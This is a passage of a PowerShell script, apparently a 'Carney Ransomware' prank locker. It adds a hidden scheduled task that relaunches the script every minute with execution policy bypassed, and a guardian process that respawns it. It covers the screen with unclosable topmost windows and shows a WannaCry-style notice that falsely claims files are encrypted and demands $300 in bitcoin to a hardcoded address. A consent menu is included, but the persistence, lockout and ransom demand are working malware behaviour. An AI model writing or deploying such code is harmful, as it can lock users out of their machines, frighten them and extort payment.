            $null = Get-Process -Id $gid -ErrorAction Stop
            $alive = $true
        }
    } catch { $alive = $false }
    if (-not $alive) { Start-Guardian | Out-Null }
}
function Register-CarneyTask {
    try {
        $action = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$script:LaunchPath`""
        & schtasks.exe /Create /TN "CarneyRansomware" /SC MINUTE /MO 1 /TR $action /F 2>$null | Out-Null
    } catch { }
}
function Remove-CarneyTask { try { & schtasks.exe /Delete /TN "CarneyRansomware" /F 2>$null | Out-Null } catch { } }

# ============================================================
# QUIT (only from the boot menu)
# ============================================================
function Quit-Everything {
    $script:AllowClose = $true
    try { [CarneyHook]::Uninstall() } catch { }
    Show-Cursor
    try {
        if (Test-Path -LiteralPath $script:GuardianPid) {
            $gid = [int](Get-Content -LiteralPath $script:GuardianPid -Raw).Trim()
            Stop-Process -Id $gid -Force -ErrorAction SilentlyContinue
        }
    } catch { }
    Remove-CarneyTask
    foreach ($f in @($script:PidFile, $script:GuardianPid)) { try { Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue } catch { } }
    try { if ($script:Ransom -ne $null) { $script:Ransom.Close() } } catch { }
    try { if ($script:Stage -ne $null) { $script:Stage.Window.Close() } } catch { }
    try { if ($script:Countdown -ne $null) { $script:Countdown.Close() } } catch { }
    Start-Explorer
    try { if ($script:MenuWindow -ne $null) { $script:MenuWindow.Window.Close() } } catch { }
    try { if ($script:Overlay -ne $null) { $script:Overlay.Close() } } catch { }
}

# ============================================================
# OVERLAY
# ============================================================
$desktop = Get-VirtualScreen
$script:Overlay = New-Object System.Windows.Window
$script:Overlay.WindowStyle = [System.Windows.WindowStyle]::None
$script:Overlay.ResizeMode = [System.Windows.ResizeMode]::NoResize
$script:Overlay.AllowsTransparency = $true
$script:Overlay.Background = [System.Windows.Media.Brushes]::Transparent
$script:Overlay.ShowInTaskbar = $false
$script:Overlay.ShowActivated = $false
$script:Overlay.Focusable = $false
$script:Overlay.Topmost = $true
$script:Overlay.Left = $desktop.Left; $script:Overlay.Top = $desktop.Top
$script:Overlay.Width = $desktop.Width; $script:Overlay.Height = $desktop.Height
$script:Canvas = New-Object System.Windows.Controls.Canvas
$script:Canvas.Background = [System.Windows.Media.Brushes]::Transparent
$script:Overlay.Content = $script:Canvas
$script:Overlay.Show()
function Set-ClickThrough { param($Window)
    $interop = New-Object System.Windows.Interop.WindowInteropHelper -ArgumentList $Window
    $hwnd = $interop.Handle
    $style = [CarneyNative]::GetWindowLong($hwnd, [CarneyNative]::GWL_EXSTYLE)
    $style = $style -bor [CarneyNative]::WS_EX_TRANSPARENT -bor [CarneyNative]::WS_EX_LAYERED -bor [CarneyNative]::WS_EX_TOOLWINDOW -bor [CarneyNative]::WS_EX_NOACTIVATE
    [CarneyNative]::SetWindowLong($hwnd, [CarneyNative]::GWL_EXSTYLE, $style) | Out-Null
}
Set-ClickThrough -Window $script:Overlay

# ============================================================
# BOOT MENU WINDOW
# ============================================================
$screen0 = Get-VirtualScreen
$script:MenuWindow = [PSCustomObject]@{ Window = $null; Text = $null }
$mw = New-Object System.Windows.Window
$mw.WindowStyle = [System.Windows.WindowStyle]::None
$mw.ResizeMode = [System.Windows.ResizeMode]::NoResize
$mw.Background = $script:ColBg
$mw.ShowInTaskbar = $false
$mw.ShowActivated = $false
$mw.Topmost = $true
$mw.Left = $screen0.Left; $mw.Top = $screen0.Top; $mw.Width = $screen0.Width; $mw.Height = $screen0.Height
$mBorder = New-Object System.Windows.Controls.Border
$mBorder.BorderBrush = $script:ColDim; $mBorder.BorderThickness = [System.Windows.Thickness]::new(1)
$mBorder.Margin = [System.Windows.Thickness]::new(30)
$mtb = New-Object System.Windows.Controls.TextBlock
$mtb.FontFamily = $script:Mono; $mtb.FontSize = 18; $mtb.Foreground = $script:ColText
$mtb.Margin = [System.Windows.Thickness]::new(40)
$mtb.TextAlignment = [System.Windows.TextAlignment]::Left
$mBorder.Child = $mtb
$mw.Content = $mBorder
$script:MenuWindow.Window = $mw
$script:MenuWindow.Text = $mtb
Set-ClickThrough -Window $mw

function Render-Menu {
    $blink = " "
    if (([int]([DateTime]::Now.TotalSeconds * 2)) % 2 -eq 0) { $blink = "_" }
    switch ($script:MenuState) {
        "menu" {
            $t  = "CARNEY-OS 6.6.6   ::   boot menu`n"
            $t += "kernel 0xDEADBEEF   tty0   (c) 1999-2026 Carney Systems`n"
            $t += "======================================================================`n`n"
            $t += "   1)  full version          everything - 60s chaos`n"
            $t += "   2)  short version         everything - quicker`n"
            $t += "   3)  carney-os             cli chaos + lock screen`n"
            $t += "   4)  pick stages           choose which acts run`n"
            $t += "   5)  straight to ransom    skip to the lock screen`n"
            $t += "   6)  og                    original - lock screen only`n"
            $t += "   7)  quit`n`n"
            $t += "======================================================================`n"
            $t += "select [1-7] $blink"
            $script:MenuWindow.Text.Text = $t
        }
        "pick" {
            $t  = "pick stages   (1-5 toggle, ENTER = go, ESC = back)`n"
            $t += "======================================================================`n`n"
            $t += "   [1]  kirk intro               " + $(if ($script:PickIntro) { "<ON>" } else { "<off>" }) + "`n"
            $t += "   [2]  screenshot + shatter     " + $(if ($script:PickShot) { "<ON>" } else { "<off>" }) + "`n"
            $t += "   [3]  carney-os chaos          " + $(if ($script:PickChaos) { "<ON>" } else { "<off>" }) + "`n"
            $t += "   [4]  lock screen              " + $(if ($script:PickRansom) { "<ON>" } else { "<off>" }) + "`n"
            $t += "   [5]  stage sequence           " + $(if ($script:PickStage) { "<ON>" } else { "<off>" }) + "`n`n"
            $t += "======================================================================`n"
            $t += "waiting $blink"
            $script:MenuWindow.Text.Text = $t
        }
        "confirm1" { $script:MenuWindow.Text.Text = "`n`n   this malware is no joke.`n`n   continue?   [y/n] $blink" }
        "confirm2" { $script:MenuWindow.Text.Text = "`n`n   ok then. ready to start?`n`n   start?   [y/n] $blink" }
        "confirm3" { $script:MenuWindow.Text.Text = "`n`n   LAST WARNING.`n`n   there is no letmeout. once it starts you are locked in.`n`n   go?   [y/n] $blink" }
        "booting"  { $script:MenuWindow.Text.Text = "`n`n   starting carney-os...`n`n   do not turn off your pc $blink" }
    }
}

function Apply-Mode { param([int]$mode)
    switch ($mode) {
        1 { $script:DoIntro=$true;  $script:DoShot=$true;  $script:DoChaos=$true;  $script:DoStage=$true;  $script:DoRansom=$true;  $script:IntroBlankMs=6000; $script:IntroSpawnMs=12000; $script:CountdownSeconds=60 }
        2 { $script:DoIntro=$true;  $script:DoShot=$true;  $script:DoChaos=$true;  $script:DoStage=$true;  $script:DoRansom=$true;  $script:IntroBlankMs=2500; $script:IntroSpawnMs=4000;  $script:CountdownSeconds=15 }
        3 { $script:DoIntro=$false; $script:DoShot=$false; $script:DoChaos=$true;  $script:DoStage=$true;  $script:DoRansom=$true;  $script:CountdownSeconds=60 }
        4 { $script:DoIntro=$script:PickIntro; $script:DoShot=$script:PickShot; $script:DoChaos=$script:PickChaos; $script:DoStage=$script:PickStage; $script:DoRansom=$script:PickRansom; $script:CountdownSeconds=60 }
        5 { $script:DoIntro=$false; $script:DoShot=$false; $script:DoChaos=$false; $script:DoStage=$true;  $script:DoRansom=$true }
        6 { $script:DoIntro=$false; $script:DoShot=$false; $script:DoChaos=$false; $script:DoStage=$false; $script:DoRansom=$true }
    }
}

function Begin-Run {
    $script:MenuState = "booting"
    Render-Menu
    Apply-Mode $script:MenuChoice
    $script:RunStarted = $true
    $script:MenuWindow.Window.Visibility = [System.Windows.Visibility]::Hidden
    Hide-Cursor
    Start-NextAct "start"
}

function Start-NextAct { param([string]$from)
    if ($from -eq "start") {
        if ($script:DoIntro) { Start-Intro; return }
        $from = "intro"
    }
    if ($from -eq "intro") {
        if ($script:DoShot) { Start-Act2; return }
        $from = "shot"
    }
    if ($from -eq "shot") {
        if ($script:DoChaos) { Start-Chaos; return }
        $from = "chaos"
    }
    if ($from -eq "chaos") {
        if ($script:DoStage) { Start-RansomSequence; return }
        $from = "stage"
    }
    Show-RansomWindow
}

function Update-Menu {
    if ($script:RunStarted) { return }
    $blinkDirty = $false
    Render-Menu
    switch ($script:MenuState) {
        "menu" {
            for ($i = 1; $i -le 7; $i++) {
                if (KeyHit (0x30 + $i)) {
                    if ($i -eq 7) { Quit-Everything; return }
                    $script:MenuChoice = $i
                    if ($i -eq 4) { $script:MenuState = "pick" } else { $script:MenuState = "confirm1" }
                    Render-Menu; return
                }
            }
        }
        "pick" {
            if (KeyHit 0x31) { $script:PickIntro = -not $script:PickIntro }
            if (KeyHit 0x32) { $script:PickShot = -not $script:PickShot }
            if (KeyHit 0x33) { $script:PickChaos = -not $script:PickChaos }
            if (KeyHit 0x34) { $script:PickRansom = -not $script:PickRansom }
            if (KeyHit 0x35) { $script:PickStage = -not $script:PickStage }
            if (KeyHit 0x0D) { $script:MenuChoice = 4; $script:MenuState = "confirm1" }
            if (KeyHit 0x1B) { $script:MenuState = "menu" }
        }
        "confirm1" { if (KeyHit 0x59) { $script:MenuState = "confirm2" } elseif (KeyHit 0x4E) { $script:MenuState = "menu" } }
        "confirm2" { if (KeyHit 0x59) { $script:MenuState = "confirm3" } elseif (KeyHit 0x4E) { $script:MenuState = "menu" } }
        "confirm3" { if (KeyHit 0x59) { Begin-Run } elseif (KeyHit 0x4E) { $script:MenuState = "menu" } }
    }
}

# ============================================================
# COUNTDOWN WINDOW
# ============================================================
$cdWidth = 620; $cdHeight = 96
$primary = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$script:Countdown = New-Object System.Windows.Window
$script:Countdown.WindowStyle = [System.Windows.WindowStyle]::None
$script:Countdown.ResizeMode = [System.Windows.ResizeMode]::NoResize
$script:Countdown.AllowsTransparency = $true
$script:Countdown.Background = [System.Windows.Media.Brushes]::Transparent
$script:Countdown.ShowInTaskbar = $false; $script:Countdown.ShowActivated = $false
$script:Countdown.Focusable = $false; $script:Countdown.Topmost = $true
$script:Countdown.Width = $cdWidth; $script:Countdown.Height = $cdHeight
$script:Countdown.Left = $primary.Left + (($primary.Width - $cdWidth) / 2)
$script:Countdown.Top = $primary.Top + $primary.Height - $cdHeight - 40
$cdBorder = New-Object System.Windows.Controls.Border
$cdBorder.Background = $script:ColBg; $cdBorder.BorderBrush = $script:ColDim
$cdBorder.BorderThickness = [System.Windows.Thickness]::new(1); $cdBorder.CornerRadius = [System.Windows.CornerRadius]::new(0)
$script:CountdownText = New-Object System.Windows.Controls.TextBlock
$script:CountdownText.FontFamily = $script:Mono
$script:CountdownText.Text = "time until full carney: ${script:CountdownSeconds}s"
$script:CountdownText.Foreground = $script:ColBright; $script:CountdownText.FontSize = 26
$script:CountdownText.TextAlignment = [System.Windows.TextAlignment]::Center
$script:CountdownText.TextWrapping = [System.Windows.TextWrapping]::Wrap
$script:CountdownText.HorizontalAlignment = [System.Windows.HorizontalAlignment]::Center
$script:CountdownText.VerticalAlignment = [System.Windows.VerticalAlignment]::Center
$cdBorder.Child = $script:CountdownText
$script:Countdown.Content = $cdBorder
$script:Countdown.Show()
$script:Countdown.Visibility = [System.Windows.Visibility]::Hidden
Set-ClickThrough -Window $script:Countdown

# ============================================================
# STAGE WINDOW
# ============================================================
function New-StageWindow {
    $desktop = Get-VirtualScreen
    $w = New-Object System.Windows.Window
    $w.WindowStyle = [System.Windows.WindowStyle]::None
    $w.ResizeMode = [System.Windows.ResizeMode]::NoResize
    $w.Background = $script:ColBg
    $w.ShowInTaskbar = $false; $w.ShowActivated = $false; $w.Focusable = $false; $w.Topmost = $true
    $w.Left = $desktop.Left; $w.Top = $desktop.Top; $w.Width = $desktop.Width; $w.Height = $desktop.Height
    $grid = New-Object System.Windows.Controls.Grid
    $border = New-Object System.Windows.Controls.Border; $border.Background = $script:ColBg
    [void]$grid.Children.Add($border)
    $image = New-Object System.Windows.Controls.Image
    $image.Stretch = [System.Windows.Media.Stretch]::Uniform; $image.Margin = [System.Windows.Thickness]::new(120)
    $image.Visibility = [System.Windows.Visibility]::Collapsed
    [void]$grid.Children.Add($image)
    $text = New-Object System.Windows.Controls.TextBlock
    $text.FontFamily = $script:Mono; $text.Text = ""; $text.Foreground = $script:ColBright
    $text.FontSize = 34; $text.TextAlignment = [System.Windows.TextAlignment]::Center
    $text.HorizontalAlignment = [System.Windows.HorizontalAlignment]::Center
    $text.VerticalAlignment = [System.Windows.VerticalAlignment]::Center
    $text.Visibility = [System.Windows.Visibility]::Collapsed
    [void]$grid.Children.Add($text)
    $loading = New-Object System.Windows.Controls.StackPanel
    $loading.HorizontalAlignment = [System.Windows.HorizontalAlignment]::Center
    $loading.VerticalAlignment = [System.Windows.VerticalAlignment]::Center
    $loading.Visibility = [System.Windows.Visibility]::Collapsed
    $loadTitle = New-Object System.Windows.Controls.TextBlock
    $loadTitle.Text = "carney-rs 6.6.6"; $loadTitle.FontFamily = $script:Mono; $loadTitle.FontSize = 28
    $loadTitle.Foreground = $script:ColBright; $loadTitle.HorizontalAlignment = [System.Windows.HorizontalAlignment]::Center
    $loadStatus = New-Object System.Windows.Controls.TextBlock
    $loadStatus.Text = "initializing..."; $loadStatus.FontFamily = $script:Mono; $loadStatus.FontSize = 15
    $loadStatus.Foreground = $script:ColText; $loadStatus.Margin = [System.Windows.Thickness]::new(0, 18, 0, 12)
    $loadStatus.HorizontalAlignment = [System.Windows.HorizontalAlignment]::Center
    $bar = New-Object System.Windows.Controls.TextBlock
    $bar.FontFamily = $script:Mono; $bar.FontSize = 18; $bar.Foreground = $script:ColAmber
    $bar.Text = (Format-Bar 0 50); $bar.HorizontalAlignment = [System.Windows.HorizontalAlignment]::Center
    $percent = New-Object System.Windows.Controls.TextBlock
    $percent.Text = "  0%"; $percent.FontFamily = $script:Mono; $percent.FontSize = 15; $percent.Foreground = $script:ColText
    $percent.Margin = [System.Windows.Thickness]::new(0, 8, 0, 0); $percent.HorizontalAlignment = [System.Windows.HorizontalAlignment]::Center
    [void]$loading.Children.Add($loadTitle); [void]$loading.Children.Add($loadStatus)
    [void]$loading.Children.Add($bar); [void]$loading.Children.Add($percent)
    [void]$grid.Children.Add($loading)
    $w.Content = $grid
    return [PSCustomObject]@{ Window = $w; Brush = $border; Text = $text; Image = $image; Loading = $loading; Bar = $bar; Status = $loadStatus; Percent = $percent }
}
function Set-StagePhase { param([int]$Phase)
    $script:StagePhase = $Phase; $script:StagePhaseStart = [DateTime]::Now; $script:FlashTick = 0
    switch ($Phase) {
        0 { $script:Stage.Brush.Background = $script:ColBg; $script:Stage.Text.Visibility = 'Collapsed'; $script:Stage.Image.Visibility = 'Collapsed'; $script:Stage.Loading.Visibility = 'Collapsed' }
        1 { $script:Stage.Text.Text = "sealing the vault..."; $script:Stage.Text.Visibility = 'Visible'; $script:Stage.Brush.Background = $script:ColBg }
        2 { $script:Stage.Text.Text = "MARK CARNEY"; $script:Stage.Text.FontSize = 72; $script:Stage.Text.Visibility = 'Visible' }
        3 { }
        4 {
            $script:ImageFlashStep = 0
            $script:Stage.Brush.Background = $script:ColBg
            $script:Stage.Text.Visibility = 'Collapsed'; $script:Stage.Image.Visibility = 'Visible'
            if ($script:FlashImages.Count -gt 0) { $script:Stage.Image.Source = $script:FlashImages[0] }
        }
        5 { $script:Stage.Image.Visibility = 'Collapsed'; $script:Stage.Brush.Background = $script:ColBg }
        6 {
            $script:Stage.Brush.Background = $script:ColBg; $script:Stage.Loading.Visibility = 'Visible'
            $script:Stage.Bar.Text = (Format-Bar 0 50); $script:Stage.Percent.Text = "  0%"; $script:Stage.Status.Text = "initializing..."
        }
        7 { $script:StageTimer.Stop(); Show-RansomWindow }
    }
}

# ============================================================
# RANSOM WINDOW
# ============================================================
function Show-RansomWindow {
    if ($script:Ransom -ne $null) { Show-Cursor; $script:Ransom.Show(); return }
    $desktop = Get-VirtualScreen
    $xaml = @'
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    WindowStyle="None" ResizeMode="NoResize" ShowInTaskbar="False" Topmost="True" Background="#ECE9D8" Title="Carney Ransomware">
  <Grid>
    <Grid.RowDefinitions><RowDefinition Height="Auto"/><RowDefinition Height="*"/><RowDefinition Height="Auto"/></Grid.RowDefinitions>
    <Border Grid.Row="0" Background="White" BorderBrush="#C8C8C8" BorderThickness="0,0,0,1">
      <Grid Margin="16,16,16,12">
        <Grid.ColumnDefinitions><ColumnDefinition Width="*"/><ColumnDefinition Width="Auto"/></Grid.ColumnDefinitions>
        <TextBlock Grid.Column="0" Text="Ooops, your files have been encrypted!" FontSize="24" FontWeight="Bold" Foreground="#111111" VerticalAlignment="Center"/>
      </Grid>
    </Border>
    <Grid Grid.Row="1">
      <Grid.ColumnDefinitions><ColumnDefinition Width="340"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
      <Border Grid.Column="0" Background="#7B2F27">
        <StackPanel Margin="14">
          <Border Background="White" Padding="8" CornerRadius="2"><Image x:Name="CarneyImage" Height="150" Stretch="Uniform"/></Border>
          <Border Background="#A24C42" Margin="0,16,0,0" Padding="10" CornerRadius="2">
            <StackPanel>
              <TextBlock Text="Payment will be raised on" FontSize="12" Foreground="White" FontWeight="Bold"/>
              <TextBlock x:Name="RaiseDate" Text="-" FontSize="11" Foreground="#F0D0C0" Margin="0,6,0,0"/>
              <TextBlock Text="Time Left" FontSize="12" Foreground="White" FontWeight="Bold" Margin="0,8,0,0"/>
              <Border Background="#5E1E18" Margin="0,4,0,0" Padding="6"><TextBlock x:Name="TimeLeft1" Text="00:00:00:00" FontSize="24" FontFamily="Consolas" Foreground="#FF3B30"/></Border>
            </StackPanel>
          </Border>
          <Border Background="#A24C42" Margin="0,12,0,0" Padding="10" CornerRadius="2">
            <StackPanel>
              <TextBlock Text="Your files will be lost on" FontSize="12" Foreground="White" FontWeight="Bold"/>
              <TextBlock x:Name="LostDate" Text="-" FontSize="11" Foreground="#F0D0C0" Margin="0,6,0,0"/>
              <TextBlock Text="Time Left" FontSize="12" Foreground="White" FontWeight="Bold" Margin="0,8,0,0"/>
              <Border Background="#5E1E18" Margin="0,4,0,0" Padding="6"><TextBlock x:Name="TimeLeft2" Text="00:00:00:00" FontSize="24" FontFamily="Consolas" Foreground="#FF3B30"/></Border>
            </StackPanel>
          </Border>
        </StackPanel>
      </Border>
      <Border Grid.Column="1" Background="White">
        <ScrollViewer VerticalScrollBarVisibility="Auto" Margin="18,12,14,12">
          <StackPanel>
            <TextBlock Text="What Happened to My Computer?" FontSize="18" FontWeight="Bold" Foreground="#1F3B73"/>
            <TextBlock Margin="0,6,0,0" FontSize="13" TextWrapping="Wrap" Foreground="#222222" Text="Your important files are encrypted."/>
            <TextBlock Margin="0,6,0,0" FontSize="13" TextWrapping="Wrap" Foreground="#222222" Text="Many of your documents, photos, videos, databases and other files are no longer accessible because they have been encrypted. Maybe you are busy looking for a way to recover your files, but do not waste your time. Nobody can recover your files without our decryption service."/>
            <TextBlock Text="Can I Recover My Files?" FontSize="18" FontWeight="Bold" Foreground="#1F3B73" Margin="0,18,0,0"/>
            <TextBlock Margin="0,6,0,0" FontSize="13" TextWrapping="Wrap" Foreground="#222222" Text="Sure we guarantee that you can recover all your files safely and easily. But you have not so enough time."/>
            <TextBlock Margin="0,6,0,0" FontSize="13" TextWrapping="Wrap" Foreground="#222222" Text="You only have 3 days to submit the payment. After that the price will be doubled. Also, if you don't pay in 7 days, you won't be able to recover your files forever."/>
            <TextBlock Text="There is no letmeout." FontSize="14" FontWeight="Bold" TextWrapping="Wrap" Foreground="#B00000" Margin="0,18,0,0"/>
            <TextBlock Text="To leave: kill this process. It will come straight back to the boot menu - press 7 there to truly escape. Killing it or rebooting will not help." FontSize="12" TextWrapping="Wrap" Foreground="#444444" Margin="0,6,0,0"/>
          </StackPanel>
        </ScrollViewer>
      </Border>
    </Grid>
    <Border Grid.Row="2" Background="#B0332A">
      <StackPanel Margin="16,14,16,16">
        <TextBlock Text="Send $300 worth of bitcoin to this address:" FontSize="13" Foreground="White"/>
        <Grid Margin="0,8,0,0">
          <Grid.ColumnDefinitions><ColumnDefinition Width="Auto"/><ColumnDefinition Width="*"/><ColumnDefinition Width="Auto"/></Grid.ColumnDefinitions>
          <Border Grid.Column="0" Background="White" Width="78" Margin="0,0,8,0"><TextBlock Text="BITCOIN" FontSize="11" FontWeight="Bold" Foreground="#F7931A" HorizontalAlignment="Center" VerticalAlignment="Center"/></Border>
          <Border Grid.Column="1" Background="White" Padding="10,7"><TextBlock Text="12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw" FontSize="15" FontWeight="Bold" Foreground="#111111" VerticalAlignment="Center"/></Border>
          <Button x:Name="CopyButton" Grid.Column="2" Content="Copy" Width="78" Margin="8,0,0,0" FontSize="13"/>
        </Grid>
        <Grid Margin="0,14,0,0">
          <Grid.ColumnDefinitions><ColumnDefinition Width="*"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
          <Button x:Name="CheckButton" Grid.Column="0" Content="Check Payment" Height="36" Margin="0,0,7,0" FontSize="14"/>
          <Button x:Name="DecryptButton" Grid.Column="1" Content="Decrypt" Height="36" Margin="7,0,0,0" FontSize="14"/>
        </Grid>
      </StackPanel>
    </Border>
  </Grid>
</Window>
'@
    $w = [System.Windows.Markup.XamlReader]::Parse($xaml)
    $w.Left = $desktop.Left; $w.Top = $desktop.Top; $w.Width = $desktop.Width; $w.Height = $desktop.Height
    $w.Topmost = $true; $w.ShowInTaskbar = $false
    $script:Ransom = $w
    $w.Add_Closing({ param($sender, $e) if (-not $script:AllowClose) { $e.Cancel = $true } })
    $img = $w.FindName("CarneyImage")
    if ($img -ne $null) { foreach ($candidate in $script:Images) { try { $img.Source = Get-ImageSource -Url $candidate; break } catch { $script:BadImages[$candidate] = $true } } }
    $copy = $w.FindName("CopyButton")
    if ($copy -ne $null) { $copy.Add_Click({ try { [System.Windows.Clipboard]::SetText("12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw") } catch { } }) }
    $script:RaiseAt = [DateTime]::Now.AddDays(3); $script:LostAt = [DateTime]::Now.AddDays(7)
    $raiseDate = $w.FindName("RaiseDate"); $lostDate = $w.FindName("LostDate")
    if ($raiseDate -ne $null) { $raiseDate.Text = $script:RaiseAt.ToString("M/d/yyyy HH:mm:ss") }
    if ($lostDate -ne $null) { $lostDate.Text = $script:LostAt.ToString("M/d/yyyy HH:mm:ss") }
    $script:TimeLeft1Block = $w.FindName("TimeLeft1"); $script:TimeLeft2Block = $w.FindName("TimeLeft2")
    $script:RansomTimer = New-Object System.Windows.Threading.DispatcherTimer
    $script:RansomTimer.Interval = [TimeSpan]::FromSeconds(1)
    $script:RansomTimer.Add_Tick({
        $n = [DateTime]::Now
        if ($script:TimeLeft1Block -ne $null) { $script:TimeLeft1Block.Text = Format-Span ($script:RaiseAt - $n) }
        if ($script:TimeLeft2Block -ne $null) { $script:TimeLeft2Block.Text = Format-Span ($script:LostAt - $n) }
    })
    $script:RansomTimer.Start()
    Show-Cursor
    $w.Show(); $w.Activate()
}

# ============================================================
# ACT 0 : KIRK INTRO
# ============================================================
function Set-IntroStage { param([int]$s)
    $script:IntroStage = $s; $script:IntroStageStart = [DateTime]::Now
    if ($s -eq 1) { $script:IntroSwapped = $false }
    if ($s -eq 3) { $script:IntroSwapped2 = $false }
}
function Show-IntroTile { param([int]$i)
    $t = $script:IntroTiles[$i]
    $t.Img.Visibility = [System.Windows.Visibility]::Visible
    foreach ($prop in @([System.Windows.Media.ScaleTransform]::ScaleXProperty, [System.Windows.Media.ScaleTransform]::ScaleYProperty)) {
        $anim = New-Object System.Windows.Media.Animation.DoubleAnimation
        $anim.From = $script:IntroZoomFrom; $anim.To = 1.0
        $anim.Duration = [System.Windows.Duration]::new([TimeSpan]::FromMilliseconds($script:IntroZoomMs))
        $t.Scale.BeginAnimation($prop, $anim)
    }
}
function Start-Intro {
    $screen = Get-VirtualScreen
    $wall = New-Object System.Windows.Controls.Image
    $wall.Stretch = [System.Windows.Media.Stretch]::Fill
    $wall.Width = $screen.Width; $wall.Height = $screen.Height
    [System.Windows.Controls.Canvas]::SetLeft($wall, 0); [System.Windows.Controls.Canvas]::SetTop($wall, 0)
    try { $wall.Source = Get-ImageSource -Url $script:KirkBlank } catch { }
    [void]$script:Canvas.Children.Add($wall)
    $script:IntroWall = $wall
    $script:IntroTiles = New-Object System.Collections.ArrayList
    for ($i = 0; $i -lt $script:IntroTileCount; $i++) {
        $im = New-Object System.Windows.Controls.Image
        $im.Width = $script:BaseSize; $im.Height = $script:BaseSize
        $im.Stretch = [System.Windows.Media.Stretch]::Fill
        try { $im.Source = Get-ImageSource -Url $script:KirkTile } catch { }
        $im.Visibility = [System.Windows.Visibility]::Collapsed
        $st = New-Object System.Windows.Media.ScaleTransform
        $st.ScaleX = $script:IntroZoomFrom; $st.ScaleY = $script:IntroZoomFrom
        $im.RenderTransform = $st; $im.RenderTransformOrigin = [System.Windows.Point]::new(0.5, 0.5)
        $x = Get-Random -Minimum 0 -Maximum ([int]($screen.Width - $script:BaseSize))
        $y = Get-Random -Minimum 0 -Maximum ([int]($screen.Height - $script:BaseSize))
        [System.Windows.Controls.Canvas]::SetLeft($im, $x); [System.Windows.Controls.Canvas]::SetTop($im, $y)
        [void]$script:Canvas.Children.Add($im)
        [void]$script:IntroTiles.Add(@{ Img = $im; Scale = $st })
    }
    $flash = New-Object System.Windows.Controls.Rectangle
    $flash.Width = $screen.Width; $flash.Height = $screen.Height
    $flash.Fill = [System.Windows.Media.Brushes]::White; $flash.Opacity = 0
    [System.Windows.Controls.Canvas]::SetLeft($flash, 0); [System.Windows.Controls.Canvas]::SetTop($flash, 0)
    [void]$script:Canvas.Children.Add($flash)
    $script:IntroFlash = $flash
    $times = @()
    for ($i = 0; $i -lt $script:IntroTileCount; $i++) { $times += (Get-Random -Minimum 0 -Maximum $script:IntroSpawnMs) }
    $script:IntroSpawnTimes = @($times | Sort-Object)
    $script:IntroSpawned = 0; $script:IntroActive = $true
    Set-IntroStage 0
    $script:IntroTimer.Start()
}
function Update-Intro {
    if (-not $script:IntroActive) { return }
    $now = [DateTime]::Now
    $el = ($now - $script:IntroStageStart).TotalMilliseconds
    switch ($script:IntroStage) {
        0 { if ($el -ge $script:IntroBlankMs) { Set-IntroStage 1 } }
        1 {
            if ($el -lt 250) { $script:IntroFlash.Opacity = $el / 250 }
            elseif ($el -lt 500) {
                if (-not $script:IntroSwapped) { try { $script:IntroWall.Source = Get-ImageSource -Url $script:KirkWall } catch { }; $script:IntroSwapped = $true }
                $script:IntroFlash.Opacity = 1 - (($el - 250) / 250)
            } else { $script:IntroFlash.Opacity = 0; Set-IntroStage 2 }
        }
        2 {
            $t = ($now - $script:IntroStageStart).TotalMilliseconds
            while ($script:IntroSpawned -lt $script:IntroTileCount -and $script:IntroSpawnTimes[$script:IntroSpawned] -le $t) { Show-IntroTile $script:IntroSpawned; $script:IntroSpawned++ }
            if ($script:IntroSpawned -ge $script:IntroTileCount -and $t -ge ($script:IntroSpawnTimes[$script:IntroTileCount - 1] + 400)) { Set-IntroStage 3 }
        }
        3 {
            if ($el -lt 250) { $script:IntroFlash.Opacity = $el / 250 }
            elseif ($el -lt 500) {
                if (-not $script:IntroSwapped2) { foreach ($tt in $script:IntroTiles) { try { $tt.Img.Source = Get-ImageSource -Url $script:KirkMark } catch { } }; $script:IntroSwapped2 = $true }
                $script:IntroFlash.Opacity = 1 - (($el - 250) / 250)
            } else { $script:IntroFlash.Opacity = 0; Set-IntroStage 4 }
        }
        4 { if ($el -ge $script:IntroHoldMs) { $script:IntroActive = $false; $script:IntroTimer.Stop(); Start-NextAct "intro" } }
    }
}

# ============================================================
# ACT 1 : SCREENSHOT -> PIXELATE -> SHATTER
# ============================================================
function Start-Act2 {
    $bounds = Get-VirtualScreen
    $bmp = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height, [System.Drawing.Imaging.PixelFormat]::Format32bppArgb)
    $g = [System.Drawing.Graphics]::FromImage($bmp)
    $g.CopyFromScreen($bounds.Left, $bounds.Top, 0, 0, $bmp.Size); $g.Dispose()
    $script:ShotBitmap = $bmp
    $ms = New-Object System.IO.MemoryStream
    $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png); $ms.Position = 0
    $bi = New-Object System.Windows.Media.Imaging.BitmapImage
    $bi.BeginInit(); $bi.CacheOption = [System.Windows.Media.Imaging.BitmapCacheOption]::OnLoad; $bi.StreamSource = $ms; $bi.EndInit(); $bi.Freeze()
    $ms.Dispose()
    $shot = New-Object System.Windows.Controls.Image
    $shot.Source = $bi; $shot.Stretch = [System.Windows.Media.Stretch]::Fill
    $shot.Width = $bounds.Width; $shot.Height = $bounds.Height
    [System.Windows.Controls.Canvas]::SetLeft($shot, 0); [System.Windows.Controls.Canvas]::SetTop($shot, 0)
    [void]$script:Canvas.Children.Add($shot)
    $script:Act2Shot = $shot
    $script:Act2Active = $true; $script:Act2Stage = 0; $script:Act2StageStart = [DateTime]::Now
    $script:Act2Timer.Start()
}
function Start-Pixelate {
    $bmp = $script:ShotBitmap; $w = $bmp.Width; $h = $bmp.Height
    $rect = New-Object System.Drawing.Rectangle(0, 0, $w, $h)
    $data = $bmp.LockBits($rect, [System.Drawing.Imaging.ImageLockMode]::ReadOnly, [System.Drawing.Imaging.PixelFormat]::Format32bppArgb)
    $stride = $data.Stride
    $src = New-Object byte[] ($stride * $h)
    [System.Runtime.InteropServices.Marshal]::Copy($data.Scan0, $src, 0, $src.Length)
    $bmp.UnlockBits($data)
    $script:PixSrc = $src; $script:PixStride = $stride; $script:PixW = $w; $script:PixH = $h
    $script:PixOut = New-Object byte[] ($stride * $h); $script:PixBlock = 10
